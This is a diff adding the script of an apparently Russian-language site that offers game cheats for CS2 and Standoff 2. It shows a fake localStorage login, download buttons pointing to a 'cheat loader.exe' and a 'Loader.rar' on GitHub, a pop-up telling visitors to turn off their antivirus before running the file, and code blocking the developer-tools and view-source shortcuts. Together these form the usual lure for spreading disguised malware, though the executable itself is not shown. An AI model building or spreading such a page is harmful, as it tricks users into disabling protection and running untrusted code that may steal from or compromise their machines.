@@ -1,0 +1,237 @@
+<script>
+    async function hashPassword(password) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(password);
+        const hash = await crypto.subtle.digest('SHA-256', data);
+        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    function checkAuth() {
+        const token = localStorage.getItem('authToken');
+        const expiry = localStorage.getItem('authExpiry');
+        if (token && expiry && new Date().getTime() < expiry) {
+            document.getElementById('authModal').classList.remove('active');
+            document.getElementById('logoutBtn').style.display = 'block';
+            return true;
+        } else {
+            document.getElementById('authModal').classList.add('active');
+            document.getElementById('logoutBtn').style.display = 'none';
+            return false;
+        }
+    }
+
+    async function login(username, password) {
+        const users = JSON.parse(localStorage.getItem('users') || '{}');
+        const hashed = await hashPassword(password);
+        if (users[username] && users[username] === hashed) {
+            const expiry = new Date().getTime() + 30 * 24 * 60 * 60 * 1000;
+            localStorage.setItem('authToken', 'logged_in');
+            localStorage.setItem('authExpiry', expiry);
+            localStorage.setItem('currentUser', username);
+            checkAuth();
+            return true;
+        }
+        alert('Неверный логин или пароль');
+        return false;
+    }
+
+    async function register(username, password) {
+        if (password.length < 6) {
+            alert('Пароль должен быть не менее 6 символов');
+            return false;
+        }
+        const users = JSON.parse(localStorage.getItem('users') || '{}');
+        if (users[username]) {
+            alert('Пользователь уже существует');
+            return false;
+        }
+        const hashed = await hashPassword(password);
+        users[username] = hashed;
+        localStorage.setItem('users', JSON.stringify(users));
+        alert('Регистрация успешна! Теперь войдите.');
+        switchToLogin();
+        return true;
+    }
+
+    let isLogin = true;
+    function switchToLogin() {
+        isLogin = true;
+        document.getElementById('authTitle').textContent = 'ВХОД';
+        document.getElementById('mainAuthBtn').textContent = 'ВОЙТИ';
+        document.getElementById('switchAuthBtn').textContent = 'РЕГИСТРАЦИЯ';
+    }
+    function switchToRegister() {
+        isLogin = false;
+        document.getElementById('authTitle').textContent = 'РЕГИСТРАЦИЯ';
+        document.getElementById('mainAuthBtn').textContent = 'ЗАРЕГИСТРИРОВАТЬСЯ';
+        document.getElementById('switchAuthBtn').textContent = 'УЖЕ ЕСТЬ АККАУНТ? ВОЙТИ';
+    }
+
+    document.getElementById('mainAuthBtn').onclick = async () => {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value;
+        if (!username || !password) {
+            alert('Заполните все поля');
+            return;
+        }
+        if (isLogin) await login(username, password);
+        else await register(username, password);
+    };
+
+    document.getElementById('switchAuthBtn').onclick = () => {
+        isLogin ? switchToRegister() : switchToLogin();
+    };
+
+    document.getElementById('logoutBtn').onclick = () => {
+        localStorage.removeItem('authToken');
+        localStorage.removeItem('authExpiry');
+        localStorage.removeItem('currentUser');
+        location.reload();
+    };
+
+    const gamesModal = document.getElementById('gamesModal');
+    const openGamesBtn = document.getElementById('openGamesModal');
+    const closeGamesBtn = document.getElementById('closeGamesModal');
+
+    const aboutModal = document.getElementById('aboutModal');
+    const openAboutBtn = document.getElementById('openAboutModal');
+    const closeAboutBtn = document.getElementById('closeAboutModal');
+
+    const cheatsModal = document.getElementById('cheatsModal');
+    const closeCheatsBtn = document.getElementById('closeCheatsModal');
+    const cheatsGrid = document.getElementById('cheatsGrid');
+    const cheatsTitle = document.getElementById('cheatsTitle');
+    const passwordNote = document.getElementById('passwordNote');
+
+    const contactsModal = document.getElementById('contactsModal');
+    const openContactsBtn = document.getElementById('openContacts');
+    const closeContactsBtn = document.getElementById('closeContactsModal');
+
+    openGamesBtn.onclick = () => { if (checkAuth()) gamesModal.classList.add('active'); };
+    closeGamesBtn.onclick = () => gamesModal.classList.remove('active');
+    gamesModal.onclick = (e) => { if (e.target === gamesModal) gamesModal.classList.remove('active'); };
+
+    openAboutBtn.onclick = () => aboutModal.classList.add('active');
+    closeAboutBtn.onclick = () => aboutModal.classList.remove('active');
+    aboutModal.onclick = (e) => { if (e.target === aboutModal) aboutModal.classList.remove('active'); };
+
+    openContactsBtn.onclick = () => contactsModal.classList.add('active');
+    closeContactsBtn.onclick = () => contactsModal.classList.remove('active');
+    contactsModal.onclick = (e) => { if (e.target === contactsModal) contactsModal.classList.remove('active'); };
+
+    closeCheatsBtn.onclick = () => {
+        cheatsModal.classList.remove('active');
+        passwordNote.style.display = 'none';
+    };
+    cheatsModal.onclick = (e) => { if (e.target === cheatsModal) {
+        cheatsModal.classList.remove('active');
+        passwordNote.style.display = 'none';
+    } };
+
+    const standoffDownloadLink = 'https://github.com/L1t1um1m/ZAPRETINSTALL/raw/refs/heads/main/Loader.rar';
+    const defaultDownloadLink = 'https://github.com/L1t1um1m/ZAPRETINSTALL/raw/refs/heads/main/cheat%20loader.exe';
+
+    const cheatsData = {
+        cs2: [
+            { name: "Iniuria", desc: "Legit aimbot + ESP" },
+            { name: "Anyx.gg", desc: "Undetected wallhack + triggerbot" },
+            { name: "PassatHook", desc: "Free external cheat" },
+            { name: "Undetek", desc: "Aimbot + skin changer" },
+            { name: "InVision", desc: "Premium legit cheat" }
+        ],
+        standoff2: [
+            { name: "StandChillow", desc: "Aimbot + wallhack" },
+            { name: "MultiHack", desc: "Skin changer + god mode" },
+            { name: "StandKnife", desc: "Telekill + speed hack" },
+            { name: "Mod Menu", desc: "Unlimited ammo + no recoil" }
+        ],
+        // остальные игры можно добавить по аналогии
+    };
+
+    // Добавляем модальное уведомление об антивирусе
+    const antivirusModalHTML = `
+        <div class="modal" id="antivirusModal">
+            <div class="modal-content" style="width: 500px; padding: 40px;">
+                <span class="close-modal" id="closeAntivirusModal" style="top: 15px; right: 25px;">×</span>
+                <h2 class="modal-title" style="font-size: 36px; margin-bottom: 30px;">Внимание!</h2>
+                <p style="font-size: 24px; color: #ffd1dc; line-height: 1.5;">
+                    Отключите антивирус,<br>чтобы файл работал корректно.
+                </p>
+                <button class="get-btn" style="margin-top: 40px; padding: 15px 60px; font-size: 28px;" id="confirmAntivirus">ПОНЯТНО</button>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', antivirusModalHTML);
+
+    const antivirusModal = document.getElementById('antivirusModal');
+    document.getElementById('closeAntivirusModal').onclick = () => antivirusModal.classList.remove('active');
+    document.getElementById('confirmAntivirus').onclick = () => antivirusModal.classList.remove('active');
+    antivirusModal.onclick = (e) => { if (e.target === antivirusModal) antivirusModal.classList.remove('active'); };
+
+    document.querySelectorAll('.download-card').forEach(card => {
+        card.querySelector('.select-btn').onclick = () => {
+            const game = card.dataset.game;
+            const gameName = card.querySelector('.card-title').textContent;
+            cheatsTitle.textContent = gameName;
+
+            cheatsGrid.innerHTML = '';
+            const cheats = cheatsData[game] || [{ name: "Basic", desc: "Стандартный чит" }];
+            cheats.forEach(cheat => {
+                const downloadLink = (game === 'standoff2') ? standoffDownloadLink : defaultDownloadLink;
+                const buttonHtml = `<a href="${downloadLink}" target="_blank" class="download-btn antivirus-trigger" style="text-decoration:none;color:white;display:block;">Скачать</a>`;
+                const cardHtml = `
+                    <div class="download-card">
+                        <h3 class="card-title">${cheat.name}</h3>
+                        <p class="card-desc">${cheat.desc}</p>
+                        ${buttonHtml}
+                    </div>
+                `;
+                cheatsGrid.innerHTML += cardHtml;
+            });
+
+            if (game === 'standoff2') {
+                passwordNote.style.display = 'block';
+            } else {
+                passwordNote.style.display = 'none';
+            }
+
+            cheatsModal.classList.add('active');
+
+            // Назначаем обработчики на новые кнопки Скачать
+            document.querySelectorAll('.antivirus-trigger').forEach(btn => {
+                btn.onclick = (e) => {
+                    e.preventDefault(); // останавливаем немедленное скачивание
+                    antivirusModal.classList.add('active'); // показываем уведомление
+
+                    // После закрытия уведомления запускаем скачивание
+                    const closeHandler = () => {
+                        window.open(btn.href, '_blank');
+                        antivirusModal.removeEventListener('click', outsideClickHandler);
+                        document.getElementById('closeAntivirusModal').removeEventListener('click', closeHandler);
+                        document.getElementById('confirmAntivirus').removeEventListener('click', closeHandler);
+                    };
+
+                    const outsideClickHandler = (ev) => {
+                        if (ev.target === antivirusModal) closeHandler();
+                    };
+
+                    document.getElementById('closeAntivirusModal').addEventListener('click', closeHandler);
+                    document.getElementById('confirmAntivirus').addEventListener('click', closeHandler);
+                    antivirusModal.addEventListener('click', outsideClickHandler);
+                };
+            });
+        };
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+            (e.ctrlKey && e.key.toLowerCase() === 'u') || 
+            (e.metaKey && e.altKey && e.key.toLowerCase() === 'i')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    window.onload = checkAuth;
+</script>
